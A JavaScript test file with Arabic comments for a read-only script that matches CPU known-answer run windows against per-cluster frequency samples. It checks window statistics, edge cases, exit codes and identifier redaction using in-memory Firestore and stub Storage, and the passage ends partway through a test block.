'use strict';

// clusterFreqWindows.test.js — سكربت قراءة تردّدات العناقيد في نوافذ تشغيلات D (2026-10-13 +03): scripts/cluster-freq-windows-readonly.js وscripts/lib/clusterFreqWindows.js.
//
// قرار المستخدم، بنصّه (منقول من أمر المنسّق، غير متحقَّق من مصدره عندي): «الـS21 أبطأ: (أ) أوّلاً، سكربت قراءة يطابق نوافذ التشغيلات بتردّدات العناقيد.»
// متطلّبات الأمر على الاختبار: «يُختبر دون شبكة على مُدخل مصنوع من شكل المنتِج الحقيقي.» و«قراءة فقط (القاعدة 42): لا كتابة، ولا حذف، ولا تعديل في Firestore ولا Storage. وأخطاء المزوّد تُنقّى قبل طباعتها (القاعدة 36).»
//
// المُدخل: الحمولة الذهبية fv69 (16ch: أربع سياسات cpu_freq_policy{N}_khz، قائمة فشل مبتورة لسياسة، cpuPolicies بسياسة غير مقروءة، وcpuKnownAnswerRuns[] بست تشغيلات منها not_reached بلا t وtEnd) —
// وهي مشتقّة من حمولة التطبيق الحقيقية (ملفّها مولَّد ومُلتزَم، القاعدة 41). Firestore ذاكرة (test/lib/memFirestore.js) وStorage مزيَّف يخدم البايتات (test/lib/deviceCheck03Harness.js): لا شبكة.
//
// ما يغطّيه:
//   ١ التحليل مقابل **حساب مستقلّ** في الاختبار نفسه (حلقة بسيطة على الحمولة، لا من مخرَج الدالّة): الحالة والعدد والأدنى والوسيط والأعلى وأقرب عيّنة قبل النافذة وبعدها وبُعد ما بينهما — لكل تشغيل ولكل عنقود.
//   ٢ حالات صريحة (القاعدة 22): نافذة بلا عيّنة، تشغيل بلا t/tEnd، نافذة سالبة، لا عيّنة قبل/بعد، قناة بلا عيّنة صالحة، استثناء قراءات فاشلة (مبتور)، قيمة غير موجبة، جهاز بلا قنوات سياسات.
//   ٣ كل تقرير غير قابل للتحليل يُسمّى بسببه ويُكتب الملفّ ورمز الخروج 3؛ ونصّ خطأ المزوّد لا يظهر (القاعدة 36).
//   ٤ حارس «لا يكتب»: ساكن على مصدرَي السكربت، وديناميكي (db وbucket مزيَّفان يسجّلان كل كتابة، ومراقب fs، ومنع الشبكة، والتقاط المطبوع)، وسبع طفرات يجب أن يبلّغ الحارس عن كلٍّ منها بانتهاكها المسمّى.
//
// Run: node functions/test/clusterFreqWindows.test.js

const assert = require('assert');
const fs = require('fs');
const os = require('os');
const path = require('path');
const Module = require('module');

let n = 0;
const ok = (c, m) => { assert.ok(c, m); n++; };
const eq = (a, b, m) => { assert.strictEqual(a, b, `${m} — got ${JSON.stringify(a)}, want ${JSON.stringify(b)}`); n++; };
const deq = (a, b, m) => { assert.deepStrictEqual(a, b, m); n++; };

const {lightenFingerprintForStorage} = require('../src/analysis/lightenFingerprintForStorage');
const {makeMemDb} = require('./lib/memFirestore');
const H = require('./lib/deviceCheck03Harness');
const C = require('../scripts/lib/deviceCheck03Common');
const L = require('../scripts/lib/clusterFreqWindows');
const {main} = require('../scripts/cluster-freq-windows-readonly');

const FN = path.join(__dirname, '..');
const SCRIPT = path.join(FN, 'scripts', 'cluster-freq-windows-readonly.js');
const LIB = path.join(FN, 'scripts', 'lib', 'clusterFreqWindows.js');
const GOLDEN = path.join(FN, 'test', 'fixtures', 'golden');
const STEM = 'fv69-app-request-payload-derived-from-fv67-golden-34dff2b8-';
const payloadOf = (k) => JSON.parse(fs.readFileSync(path.join(GOLDEN, `${STEM}${k}.json`), 'utf8'));
const clone = (x) => JSON.parse(JSON.stringify(x));
const storageFileOf = (payload) => { const {timeSeriesState, ...file} = payload.timeSeries; void timeSeriesState; return file; };
const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'cfw-test-'));
let counter = 0;
const nextOut = () => path.join(tmp, `out-${++counter}.json`);

const SECRET = {scan: 'scan-S21-secret-0001', scanB: 'scan-S10-secret-0002', short21: 'NC-SSS001', short10: 'NC-TTT002', sha: 'sha-S21', bearer: 'Bearer SECRETTOKEN-xyz-9999'};
const SECRETS = [SECRET.scan, SECRET.scanB, SECRET.short21, SECRET.short10, SECRET.sha, 'sha-S10', 'scans/sha-', SECRET.bearer, 'SECRETTOKEN'];
const NOW = 1_800_000_000_000;

/** عالم مزيَّف: tags ⟵ {payload, shortId, scanId, ...خيارات}. */
function seed(entries) {
  const reports = {};
  const reportRaw = {};
  const objects = {};
  for (const e of entries) {
    reports[e.scanId] = {shortId: e.shortId, userId: 'u', pipeline: 'v7_findings_based'};
    const sp = `scans/${e.sha}/${e.scanId}.ts.json.gz`;
    if (e.raw !== false) reportRaw[e.scanId] = {scanId: e.scanId, rawFingerprint: clone(lightenFingerprintForStorage(e.payload)), sessionId: null, deviceFingerprintSha: e.sha, ...(e.noStoragePath ? {} : {timeSeriesStoragePath: sp}), aiAudit: null, source: 'analyzeDevice'};
    if (e.object !== undefined) objects[sp] = e.object;
    else if (!e.noObject) objects[sp] = H.gz(e.file || storageFileOf(e.payload));
  }
  return {collections: {reports, reportRaw}, objects};
}

async function run(entries, tokens, {extraReports} = {}) {
  const world = seed(entries);
  if (extraReports) Object.assign(world.collections.reports, extraReports);
  const db = makeMemDb(world.collections);
  const {bucket, writeAttempts: bucketWrites} = H.makeStubBucket(world.objects);
  const outPath = nextOut();
  const spy = H.spyFsWrites();
  const net = H.blockNonLocalNetwork();
  const cap = H.captureConsole();
  const outs = [];
  let code = null;
  let thrown = null;
  try {
    code = await main(['--tokens', tokens, '--out', outPath], {db, bucket, now: () => NOW, out: (s) => outs.push(String(s)), err: (s) => outs.push(String(s))});
  } catch (e) {
    thrown = e;
  } finally {
    cap.restore(); net.restore(); spy.restore();
  }
  const fileText = fs.existsSync(outPath) ? fs.readFileSync(outPath, 'utf8') : '';
  return {code, thrown, outs, doc: fileText ? JSON.parse(fileText) : null, fileText, outPath, db, bucketWrites, fsWrites: spy.writes, blocked: net.blocked, captured: cap.chunks,
    allText: `${outs.join('\n')}\n${cap.chunks.join('\n')}\n${fileText}${thrown ? `\n${String(thrown && thrown.message)}` : ''}`};
}

/** حساب مستقلّ للنافذة من الحمولة الخام: حلقة بسيطة بلا أيّ دالّة من المكتبة (القاعدة 38: الأداة تُقاس بمصدر مستقلّ). */
function expectedWindow(payload, channelName, t, tEnd) {
  const ts = payload.timeSeries;
  const names = ts.variables.map((v) => v.name);
  const ci = names.indexOf(channelName);
  const ti = names.indexOf('timestamp_ms');
  assert.ok(ci >= 0 && ti >= 0, `channel ${channelName} in variables`);
  const failed = new Set(((ts.footer.channelReadFailures || {})[channelName]) || []);
  const pts = [];
  ts.samples.forEach((s, i) => {
    if (failed.has(i)) return;
    const v = s.v[ci];
    if (!(typeof v === 'number' && v > 0)) return;
    pts.push({tm: s.v[ti], v});
  });
  const inw = pts.filter((p) => p.tm >= t && p.tm <= tEnd).map((p) => p.v).sort((a, b) => a - b);
  const bef = pts.filter((p) => p.tm < t).sort((a, b) => b.tm - a.tm)[0] || null;
  const aft = pts.filter((p) => p.tm > tEnd).sort((a, b) => a.tm - b.tm)[0] || null;
  const med = inw.length === 0 ? null : (inw.length % 2 ? inw[(inw.length - 1) / 2] : (inw[inw.length / 2 - 1] + inw[inw.length / 2]) / 2);
  return {
    state: pts.length === 0 ? 'NO_VALID_SAMPLES_FOR_CHANNEL' : (inw.length ? 'SAMPLES_IN_WINDOW' : 'NO_SAMPLE_IN_WINDOW'),
    count: inw.length, minKhz: inw.length ? inw[0] : null, medianKhz: med, maxKhz: inw.length ? inw[inw.length - 1] : null,
    before: bef ? {ts: bef.tm, khz: bef.v, dtMs: t - bef.tm} : null, after: aft ? {ts: aft.tm, khz: aft.v, dtMs: aft.tm - tEnd} : null,
    gap: bef && aft ? aft.tm - bef.tm : null,
  };
}

(async () => {
  // ═══════════════════════════════════════════════════════════════════
  // ١ — المُدخل الحقيقي الشكل: التحليل مقابل الحساب المستقلّ
  // ═══════════════════════════════════════════════════════════════════
  const p21 = payloadOf('16ch-four-policies-truncated-failures');
  {
    const r = await run([{payload: p21, shortId: SECRET.short21, scanId: SECRET.scan, sha: SECRET.sha}], `S21=${SECRET.short21}`);
    eq(r.code, 0, '[١] رمز الخروج 0 (كل التقارير ANALYZED)');
    ok(r.doc && r.doc.reports.length === 1, '[١] تقرير واحد في المخرَج');
    const b = r.doc.reports[0];
    eq(b.analysisState, 'ANALYZED', '[١] الحالة العليا ANALYZED');
    deq(b.versions, {appVersion: '1.0.11', fieldsVersion: 69}, '[١] الإصدار والختم من القارئ');
    eq(b.sampleCount, p21.timeSeries.samples.length, '[١] عدد العيّنات من الملفّ');
    deq(b.channels.map((c) => c.name), ['cpu_freq_policy0_khz', 'cpu_freq_policy2_khz', 'cpu_freq_policy4_khz', 'cpu_freq_policy6_khz', 'cpu_freq_max_khz'], '[١] العناقيد بأسماء القنوات من variables[] ثم صفّ الأساس');
    deq(b.channels.map((c) => c.policy), [0, 2, 4, 6, null], '[١] رقم السياسة من اسم القناة (لا little/mid/big)');
    deq(b.channels.map((c) => c.kind), ['POLICY', 'POLICY', 'POLICY', 'POLICY', 'BASE_MAX'], '[١] kind: أربع سياسات وقناة الأساس المرجعية');
    deq(b.channels.map((c) => c.relatedCpus), ['0 1', '2 3', '4 5', '6 7', null], '[١] relatedCpus من footer.cpuPolicies[] كما شُحنت');
    deq(b.channels[2].cpuinfoMaxFreq, {state: 'UNREADABLE', valueKhz: null, reason: p21.timeSeries.footer.cpuPolicies[2].unreadableReason}, '[١] سياسة 4: cpuinfoMaxFreq غير مقروءة بسببها المعلَن لا صفر');
    eq(b.channels[1].failedReadExclusion.tracking, 'TRUNCATED', '[١] سياسة 2: استثناء الفشل مبتور (200 من 230) — يُعلَن');
    eq(b.channels[1].failedReadExclusion.complete, false, '[١] ولا يُقدَّم تامّاً');
    eq(b.channels[0].failedReadExclusion.tracking, 'COMPLETE', '[١] سياسة 0: القائمة الفارغة الكاملة = لا فشل');
    eq(b.channels[4].failedReadExclusion.tracking, 'NOT_TRACKED_BY_DESIGN', '[١] قناة الأساس: غير متتبَّعة بالتصميم');
    const runsSrc = p21.timeSeries.footer.verificationResults.cpuKnownAnswerRuns;
    eq(b.runs.length, runsSrc.length, '[١] كل عناصر cpuKnownAnswerRuns[] حاضرة في المخرَج (لا إسقاط صامت)');
    let withSamples = 0;
    let withoutSamples = 0;
    b.runs.forEach((run, i) => {
      const src = runsSrc[i];
      eq(run.phase, src.phase, `[١] تشغيل ${i}: المرحلة`);
      ok([3, 5].includes(run.phase) && run.inExpectedPhases === true, `[١] تشغيل ${i}: ضمن المرحلتين 3 و5`);
      if (src.t === undefined) {
        eq(run.windowState, 'WINDOW_FIELDS_NOT_PRESENT', `[١] تشغيل ${i} (not_reached بلا t وtEnd): نافذته غائبة بحالة صريحة، لا [0,0]`);
        eq(run.channels, null, `[١] تشغيل ${i}: بلا قنوات (لا قيم مختلَقة)`);
        return;
      }
      eq(run.windowState, 'OK', `[١] تشغيل ${i}: نافذة صالحة`);
      eq(run.durationMs, src.tEnd - src.t, `[١] تشغيل ${i}: المدّة tEnd − t`);
      for (const ch of run.channels) {
        const want = expectedWindow(p21, ch.name, src.t, src.tEnd);
        const tag = `[١] تشغيل ${i} ${ch.name}`;
        eq(ch.state, want.state, `${tag}: الحالة`);
        eq(ch.count, want.count, `${tag}: عدد العيّنات`);
        eq(ch.minKhz, want.minKhz, `${tag}: الأدنى`);
        eq(ch.medianKhz, want.medianKhz, `${tag}: الوسيط`);
        eq(ch.maxKhz, want.maxKhz, `${tag}: الأعلى`);
        if (want.before) deq({ts: ch.nearestBefore.ts, khz: ch.nearestBefore.khz, dtMs: ch.nearestBefore.dtMs}, want.before, `${tag}: أقرب عيّنة قبل النافذة`);
        else eq(ch.nearestBefore.state, 'NONE_BEFORE_WINDOW', `${tag}: لا عيّنة قبل النافذة بحالة صريحة`);
        if (want.after) deq({ts: ch.nearestAfter.ts, khz: ch.nearestAfter.khz, dtMs: ch.nearestAfter.dtMs}, want.after, `${tag}: أقرب عيّنة بعد النافذة`);
        else eq(ch.nearestAfter.state, 'NONE_AFTER_WINDOW', `${tag}: لا عيّنة بعد النافذة بحالة صريحة`);
        eq(ch.gapBetweenNearestMs, want.gap, `${tag}: بُعد ما بين أقرب عيّنتين`);
        if (want.state === 'NO_SAMPLE_IN_WINDOW') { withoutSamples++; ok(ch.minKhz === null && ch.medianKhz === null && ch.maxKhz === null && ch.valuesKhz.length === 0, `${tag}: بلا عيّنة ⟵ لا أدنى ولا وسيط ولا أعلى (null لا صفر)`); } else withSamples++;
        eq(ch.failedReadTracking, b.channels.find((c) => c.name === ch.name).failedReadExclusion.tracking, `${tag}: اكتمال استثناء الفشل يرافق الخليّة`);
      }
    });
    ok(withSamples >= 1 && withoutSamples >= 1, `[١] المُدخل يحمل الحالتين (نوافذ بعيّنات: ${withSamples}، بلا عيّنة: ${withoutSamples}) — الاختبار يُمسك كلتيهما`);
    eq(r.doc.summary.runChannelWindowsWithSamples, withSamples, '[١] الملخّص يطابق العدّ المستقلّ (بعيّنات)');
    eq(r.doc.summary.runChannelWindowsWithoutSamples, withoutSamples, '[١] الملخّص يطابق العدّ المستقلّ (بلا عيّنة)');
    // استثناء القراءات الفاشلة فعلاً: سياسة 2 تحمل قائمة فشل (300..) — نافذة داخلها تبعد أقرب عيّنة صالحة عنها بما يزيد على فاصل العيّنة العادي
    const failedPolicy2 = new Set(p21.timeSeries.footer.channelReadFailures.cpu_freq_policy2_khz);
    ok(failedPolicy2.size === 200, '[١] (ضابط) قائمة فشل سياسة 2 في الحمولة 200 عنصر');
    const run2 = b.runs[1].channels.find((c) => c.policy === 2);
    ok(run2.nearestBefore.dtMs > 5000 && run2.nearestAfter.dtMs > 5000, '[١] سياسة 2 في المرحلة 3: القراءات الفاشلة مستثناة فأقرب عيّنة صالحة بعيدة (ثوانٍ) لا آخر قيمة صالحة كاذبة');
    // لا معرّف خامّ في أيّ مخرَج
    ok(!SECRETS.some((s) => r.allText.includes(s)), '[١] لا scanId ولا shortId ولا مسار Storage ولا رمز في المطبوع ولا في الملفّ');
    ok(r.doc.input.tags[0].shortIdHash === C.hashIdForLog(SECRET.short21) && b.shortIdHash === C.hashIdForLog(SECRET.short21) && b.scanIdHash === C.hashIdForLog(SECRET.scan), '[١] المعرّفات مُهشَّرة بالمصدر الواحد hashIdForLog');
    ok(r.outs.some((l) => /^\[S21\] phase=3 run=1 \[\d+\.\.\d+\] policy0: /.test(l)), '[١] سطر نصّي لكل (تشغيل، قناة) بالوسم وحده');
  }

  // ═══════════════════════════════════════════════════════════════════
  // ٢ — حالات صريحة على مُدخل مصنوع (دالّة التحليل الخالصة): حواف النافذة، الاستثناءات، الغياب
  // ═══════════════════════════════════════════════════════════════════
  {
    const R = {PHASE: 'phase', T: 't', T_END: 'tEnd', SIEVE_STATUS: 'sieveStatus'};
    const names = ['timestamp_ms', 'battery_temp_c', 'battery_voltage_mv', 'battery_current_ua', 'battery_level_pct', 'cpu_freq_max_khz', 'cpu_usage_pct', 'package_power_mw',
      'storage_throughput_mbps', 'memory_bandwidth_mbps', 'gpu_fps', 'cpu_freq_policy0_khz', 'cpu_freq_policy6_khz'];
    const mk = (tm, p0, p6, base = 2600000) => ({phase: 3, v: [tm, 0, 0, 0, 0, base, 0, 0, 0, 0, 0, p0, p6]});
    // ts: 0,100,200,300,400,500 ؛ policy0: 1000,2000,3000(فاشلة),4000,0(غير موجبة),6000 ؛ policy6: 11000..16000
    const samples = [mk(0, 1000, 11000), mk(100, 2000, 12000), mk(200, 3000, 13000), mk(300, 4000, 14000), mk(400, 0, 15000), mk(500, 6000, 16000)];
    const mkFacts = (runs, over = {}) => ({
      tag: 'X', shortIdHash: 'h', found: 1, scanIdHash: 's',
      rawRead: {state: 'PRIVATE', raw: {rawFingerprint: {timeSeries: {header: {appVersion: 't'}, footer: {
        fieldsVersion: 69, channelReadFailures: {cpu_freq_policy0_khz: [2], cpu_freq_policy6_khz: []}, channelReadFailureCounts: {cpu_freq_policy0_khz: 1, cpu_freq_policy6_khz: 0},
        verificationResults: {cpuKnownAnswerState: 'ran', cpuKnownAnswerRuns: runs}, ...(over.footer || {}),
      }, variables: names.map((nm) => ({name: nm, unit: ''}))}}}},
      storage: {state: 'DOWNLOADED', json: over.json || samples},
    });
    const runs = [
      {[R.PHASE]: 3, [R.T]: 100, [R.T_END]: 400}, // طرفان داخلان: 100(2000) · 200(فاشلة) · 300(4000) · 400(0 غير موجبة)
      {[R.PHASE]: 3, [R.T]: 0, [R.T_END]: 0}, //     عيّنة واحدة على الطرفين، لا عيّنة قبلها
      {[R.PHASE]: 5, [R.T]: 10000, [R.T_END]: 10100}, // بعد آخر عيّنة
      {[R.PHASE]: 5, [R.T]: -50, [R.T_END]: -10}, //  قبل أوّل عيّنة
      {[R.PHASE]: 5, [R.T]: 450, [R.T_END]: 449}, //  سالبة
      {[R.PHASE]: 3, [R.T]: 0, [R.T_END]: 200}, //    ثلاث عيّنات لـpolicy6 (وسيط فردي)
      {[R.PHASE]: 3, [R.T]: 0, [R.T_END]: 300}, //    أربع عيّنات لـpolicy6 (وسيط زوجي)
      {[R.PHASE]: 7, [R.T]: 100, [R.T_END]: 100}, //  مرحلة غير متوقَّعة: تُقيَّم وتُوسَم
      {[R.PHASE]: 3, [R.T]: 100}, //                  tEnd غائب
      {[R.PHASE]: 5, [R.SIEVE_STATUS]: 'not_reached'}, // لا t ولا tEnd
      'not-an-object',
    ];
    const b = L.analyzeFacts(mkFacts(runs));
    eq(b.analysisState, 'ANALYZED', '[٢] ANALYZED');
    const cell = (i, name) => b.runs[i].channels.find((c) => c.name === name);
    // 0: [100,400]
    let c = cell(0, 'cpu_freq_policy0_khz');
    eq(c.state, 'SAMPLES_IN_WINDOW', '[٢] [100,400]: بعيّنات'); eq(c.count, 2, '[٢] عيّنتان صالحتان (الفاشلة وغير الموجبة مستثنيتان)');
    deq([c.minKhz, c.medianKhz, c.maxKhz], [2000, 3000, 4000], '[٢] min/median/max = 2000/3000/4000');
    deq(c.valuesKhz, [2000, 4000], '[٢] القيم الصالحة في النافذة');
    deq(c.excludedInWindow, {FAILED_READ: 1, NON_FINITE: 0, NON_POSITIVE: 1}, '[٢] المستثنى في النافذة معدود بسببه: فاشلة 1، غير موجبة 1');
    deq([c.nearestBefore.ts, c.nearestBefore.khz, c.nearestBefore.dtMs], [0, 1000, 100], '[٢] أقرب عيّنة قبل 100: ts=0 (1000 kHz) بُعدها 100');
    deq([c.nearestAfter.ts, c.nearestAfter.khz, c.nearestAfter.dtMs], [500, 6000, 100], '[٢] أقرب عيّنة بعد 400: ts=500 (6000 kHz) بُعدها 100');
    eq(c.gapBetweenNearestMs, 500, '[٢] بُعد ما بين العيّنتين 500');
    eq(c.failedReadTracking, 'COMPLETE', '[٢] استثناء الفشل تامّ (قائمة كاملة بعدّها)');
    // 1: [0,0]
    c = cell(1, 'cpu_freq_policy0_khz');
    deq([c.state, c.count, c.minKhz, c.maxKhz], ['SAMPLES_IN_WINDOW', 1, 1000, 1000], '[٢] [0,0]: عيّنة واحدة على الطرف (الطرفان داخلان)');
    eq(c.nearestBefore.state, 'NONE_BEFORE_WINDOW', '[٢] [0,0]: لا عيّنة قبل النافذة — حالة صريحة');
    eq(c.gapBetweenNearestMs, null, '[٢] ولا بُعد بين عيّنتين (null لا صفر)');
    // 2: بعد آخر عيّنة
    c = cell(2, 'cpu_freq_policy0_khz');
    deq([c.state, c.count, c.minKhz, c.medianKhz, c.maxKhz], ['NO_SAMPLE_IN_WINDOW', 0, null, null, null], '[٢] نافذة بعد آخر عيّنة: NO_SAMPLE_IN_WINDOW ولا إحصاء مختلَق');
    deq([c.nearestBefore.ts, c.nearestBefore.dtMs, c.nearestAfter.state], [500, 9500, 'NONE_AFTER_WINDOW'], '[٢] أقرب قبلها 500 (9500 قبل) ولا عيّنة بعدها صراحةً');
    // 3: قبل أوّل عيّنة
    c = cell(3, 'cpu_freq_policy6_khz');
    deq([c.state, c.nearestBefore.state, c.nearestAfter.ts, c.nearestAfter.dtMs], ['NO_SAMPLE_IN_WINDOW', 'NONE_BEFORE_WINDOW', 0, 10], '[٢] نافذة قبل أوّل عيّنة: لا عيّنة قبلها صراحةً، وأقرب بعدها بـ10');
    // 4: سالبة
    eq(b.runs[4].windowState, 'WINDOW_NEGATIVE', '[٢] tEnd < t: WINDOW_NEGATIVE ولا قنوات');
    eq(b.runs[4].channels, null, '[٢] ولا قنوات للنافذة السالبة');
    // 5/6: وسيط فردي وزوجي لـpolicy6
    c = cell(5, 'cpu_freq_policy6_khz');
    deq([c.count, c.minKhz, c.medianKhz, c.maxKhz], [3, 11000, 12000, 13000], '[٢] [0,200] policy6: ثلاث عيّنات، الوسيط الأوسط 12000');
    c = cell(6, 'cpu_freq_policy6_khz');
    deq([c.count, c.minKhz, c.medianKhz, c.maxKhz], [4, 11000, 12500, 14000], '[٢] [0,300] policy6: أربع عيّنات، الوسيط متوسط الأوسطين 12500');
    // 7: مرحلة غير متوقَّعة
    eq(b.runs[7].inExpectedPhases, false, '[٢] مرحلة 7: تُوسَم خارج المرحلتين 3 و5');
    eq(b.runs[7].windowState, 'OK', '[٢] وتُقيَّم مع ذلك (لا إسقاط صامت)');
    // 8/9/10
    eq(b.runs[8].windowState, 'WINDOW_FIELDS_NOT_PRESENT', '[٢] tEnd غائب: نافذته غائبة'); ok(/tEnd:ABSENT/.test(b.runs[8].windowStateDetail), '[٢] وسبب الغياب يُسمّي الحقل');
    eq(b.runs[9].windowState, 'WINDOW_FIELDS_NOT_PRESENT', '[٢] not_reached: بلا t وtEnd');
    eq(b.runs[10].windowState, 'RUN_ELEMENT_NOT_OBJECT', '[٢] عنصر ليس كائناً: حالة صريحة');
    // قناة الأساس: كل قيمة 2600000 والنافذة [100,400] فيها أربع عيّنات (100..400) بلا استثناء فهارس
    c = cell(0, 'cpu_freq_max_khz');
    deq([c.kind, c.count, c.minKhz, c.failedReadTracking], ['BASE_MAX', 4, 2600000, 'NOT_TRACKED_BY_DESIGN'], '[٢] قناة الأساس المرجعية: غير متتبَّعة بالتصميم وتُحسب بلا استثناء فهارس');
    // قناة بلا أيّ عيّنة صالحة: كل الفهارس فاشلة
    {
      const allFailed = mkFacts([{[R.PHASE]: 3, [R.T]: 100, [R.T_END]: 400}], {footer: {channelReadFailures: {cpu_freq_policy0_khz: [0, 1, 2, 3, 4, 5], cpu_freq_policy6_khz: []}, channelReadFailureCounts: {cpu_freq_policy0_khz: 6, cpu_freq_policy6_khz: 0}}});
      const bb = L.analyzeFacts(allFailed);
      const cc = bb.runs[0].channels.find((x) => x.name === 'cpu_freq_policy0_khz');
      deq([cc.state, cc.count, cc.minKhz, cc.nearestBefore.state, cc.nearestAfter.state, cc.gapBetweenNearestMs], ['NO_VALID_SAMPLES_FOR_CHANNEL', 0, null, 'NONE_BEFORE_WINDOW', 'NONE_AFTER_WINDOW', null], '[٢] كل قراءات القناة فاشلة: NO_VALID_SAMPLES_FOR_CHANNEL بلا أرقام');
      eq(cc.excludedInWindow.FAILED_READ, 4, '[٢] والمستثنى في النافذة معدود (100..400 = 4 فهارس)');
    }
    // قائمة مبتورة ⟵ يُعلَن
    {
      const trunc = L.analyzeFacts(mkFacts([{[R.PHASE]: 3, [R.T]: 100, [R.T_END]: 400}], {footer: {channelReadFailures: {cpu_freq_policy0_khz: [2], cpu_freq_policy6_khz: []}, channelReadFailureCounts: {cpu_freq_policy0_khz: 9, cpu_freq_policy6_khz: 0}}}));
      eq(trunc.channels[0].failedReadExclusion.tracking, 'TRUNCATED', '[٢] count > طول القائمة ⟵ TRUNCATED');
      eq(trunc.runs[0].channels[0].failedReadTracking, 'TRUNCATED', '[٢] ويرافق الخليّة نفسها');
      const noCounts = L.analyzeFacts(mkFacts([{[R.PHASE]: 3, [R.T]: 100, [R.T_END]: 400}], {footer: {channelReadFailures: {cpu_freq_policy0_khz: [2], cpu_freq_policy6_khz: []}, channelReadFailureCounts: {}}}));
      eq(noCounts.channels[0].failedReadExclusion.tracking, 'COUNT_ABSENT', '[٢] قائمة بلا count ⟵ COUNT_ABSENT');
      const untracked = L.analyzeFacts(mkFacts([{[R.PHASE]: 3, [R.T]: 100, [R.T_END]: 400}], {footer: {channelReadFailures: {cpu_freq_policy6_khz: []}, channelReadFailureCounts: {cpu_freq_policy6_khz: 0}}}));
      eq(untracked.channels[0].failedReadExclusion.tracking, 'UNTRACKED', '[٢] قناة بلا مفتاح في channelReadFailures ⟵ UNTRACKED (غير متتبَّعة: لا استثناء)');
    }
    // تشغيلات غائبة كلّياً
    eq(L.analyzeFacts(mkFacts(undefined)).analysisState.startsWith('UNDETERMINED:CPU_KNOWN_ANSWER_RUNS_'), true, '[٢] لا cpuKnownAnswerRuns في الحمولة ⟵ UNDETERMINED بسببه (لا قائمة فارغة مختلَقة)');
    // evaluateWindow مباشرة
    const series = L.buildSeries([{v: [0, 5]}, {v: [10, 7]}, {v: [20, -1]}, {v: [30, 9]}, 'x', {v: [NaN, 4]}], 0, 1, new Set([3]));
    deq([series.valid.length, series.excluded.map((e) => e.reason), series.malformedSamples, series.timestampUnreadable], [2, ['NON_POSITIVE', 'FAILED_READ'], 1, 1], '[٢] buildSeries: صالحتان؛ مستثنى بسببه؛ عيّنة مشوَّهة؛ زمن غير مقروء — كلٌّ معدود');
    deq(L.evaluateWindow(series, 5, 15).valuesKhz, [7], '[٢] evaluateWindow على السلسلة');
  }

  // ═══════════════════════════════════════════════════════════════════
  // ٢-ب — جهاز بلا قنوات سياسات (11 قناة): الصفّ المرجعي وحده، وملاحظة صريحة
  // ═══════════════════════════════════════════════════════════════════
  {
    const p10 = payloadOf('11ch-nothing-admitted');
    const vr = p10.timeSeries.footer.verificationResults = p10.timeSeries.footer.verificationResults || {};
    vr.cpuKnownAnswerState = 'ran';
    const t0 = p10.timeSeries.samples[200].v[0];
    vr.cpuKnownAnswerRuns = [{phase: 3, plannedAtPct: 25, t: t0 - 10, tEnd: t0 + 250, sieveStatus: 'match', sha256Status: 'match', sieveDurationMs: 90, sha256DurationMs: 30}];
    const r = await run([{payload: p10, shortId: SECRET.short10, scanId: SECRET.scanB, sha: 'sha-S10'}], `S10=${SECRET.short10}`);
    eq(r.code, 0, '[٢-ب] رمز الخروج 0');
    const b = r.doc.reports[0];
    deq(b.channels.map((c) => c.name), ['cpu_freq_max_khz'], '[٢-ب] لا قنوات سياسات: صفّ cpu_freq_max_khz المرجعي وحده');
    eq(b.policyChannelsInLayout, 0, '[٢-ب] عدد قنوات السياسات في التخطيط 0 (حالة صريحة لا غياب صامت)');
    ok(/NO_POLICY_CHANNELS_IN_LAYOUT/.test(b.note), '[٢-ب] ملاحظة NO_POLICY_CHANNELS_IN_LAYOUT');
    const ch = b.runs[0].channels[0];
    const want = expectedWindow(p10, 'cpu_freq_max_khz', t0 - 10, t0 + 250);
    deq([ch.state, ch.count, ch.minKhz, ch.medianKhz, ch.maxKhz], [want.state, want.count, want.minKhz, want.medianKhz, want.maxKhz], '[٢-ب] نافذة 260ms على 11 قناة: الإحصاء يطابق الحساب المستقلّ');
    ok(ch.state === 'SAMPLES_IN_WINDOW', '[٢-ب] (ضابط) النافذة تحوي عيّنات');
  }

  // ═══════════════════════════════════════════════════════════════════
  // ٣ — تقرير غير قابل للتحليل يُسمّى بسببه: رمز 3، والملفّ يُكتب، ولا تسريب لنصّ المزوّد (القاعدة 36)
  // ═══════════════════════════════════════════════════════════════════
  {
    const good = {payload: p21, shortId: SECRET.short21, scanId: SECRET.scan, sha: SECRET.sha};
    const cases = [
      ['REPORT_NOT_FOUND', [good], `S21=${SECRET.short21},ZZ=NC-NOPE01`, {}, (doc) => doc.reports[1].analysisState],
      ['SHORT_ID_AMBIGUOUS(2)', [good], `S21=${SECRET.short21}`, {extraReports: {'scan-dup-0009': {shortId: SECRET.short21, userId: 'u'}}}, (doc) => doc.reports[0].analysisState],
      ['RAW_ABSENT(ABSENT)', [{...good, raw: false}], `S21=${SECRET.short21}`, {}, (doc) => doc.reports[0].analysisState],
      ['STORAGE_NOT_READ(STORAGE_PATH_ABSENT)', [{...good, noStoragePath: true}], `S21=${SECRET.short21}`, {}, (doc) => doc.reports[0].analysisState],
      ['STORAGE_NOT_READ(FILE_NOT_FOUND)', [{...good, noObject: true}], `S21=${SECRET.short21}`, {}, (doc) => doc.reports[0].analysisState],
      ['STORAGE_NOT_READ(DOWNLOAD_ERROR)', [{...good, object: Object.assign(new Error(`provider said: ${SECRET.bearer} for ${SECRET.scan} at scans/${SECRET.sha}/x`), {code: 503})}], `S21=${SECRET.short21}`, {}, (doc) => doc.reports[0].analysisState],
      ['STORAGE_NOT_READ(DOWNLOADED_NOT_GZIP)', [{...good, object: Buffer.from('not gzip at all')}], `S21=${SECRET.short21}`, {}, (doc) => doc.reports[0].analysisState],
      ['STORAGE_FILE_HAS_NO_SAMPLES_ARRAY', [{...good, file: {header: {}}}], `S21=${SECRET.short21}`, {}, (doc) => doc.reports[0].analysisState],
    ];
    for (const [want, entries, tokens, opts, pick] of cases) {
      const r = await run(entries, tokens, opts);
      eq(r.code, 3, `[٣] ${want}: رمز الخروج 3`);
      ok(r.doc !== null, `[٣] ${want}: ملفّ المخرَج يُكتب مع ذلك`);
      eq(pick(r.doc), `UNDETERMINED:${want}`, `[٣] ${want}: الحالة العليا باسم السبب`);
      ok(!SECRETS.some((s) => r.allText.includes(s)), `[٣] ${want}: لا معرّف خامّ ولا نصّ مزوّد ولا رمز في أيّ مخرَج (القاعدة 36)`);
      eq(r.db.writeAttempts.length + r.bucketWrites.length, 0, `[٣] ${want}: لا كتابة`);
    }
    {
      const noRuns = payloadOf('11ch-nothing-admitted'); // بصمة قديمة الشكل: بلا cpuKnownAnswer* (قبل D للمعالج)
